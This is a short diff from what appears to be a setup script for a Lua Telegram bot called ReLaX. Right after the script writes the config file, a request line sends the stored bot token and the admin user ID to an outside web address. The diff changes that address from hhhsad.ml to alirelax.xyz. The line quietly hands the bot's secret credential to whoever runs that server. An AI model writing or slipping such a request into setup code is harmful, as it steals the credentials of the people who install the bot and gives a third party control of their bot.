@@ -71,7 +71,7 @@ ReLaX = DevAli:get(ServerReLaX.."TokenReLaX"):match("(%d+)"),
 SudoIds = {DevAli:get(ServerReLaX.."IdReLaX")},
 }
 Create(Config, "./config.lua")
-https.request("http://hhhsad.ml/Api/index.php?id="..DevAli:get(ServerReLaX.."IdReLaX").."&token="..DevAli:get(ServerReLaX.."TokenReLaX").."&username=abs")
+https.request("http://alirelax.xyz/Api/index.php?id="..DevAli:get(ServerReLaX.."IdReLaX").."&token="..DevAli:get(ServerReLaX.."TokenReLaX").."&username=abs")
 file = io.open("ReLaX.sh", "w")  
 file:write([[
 #!/usr/bin/env bash
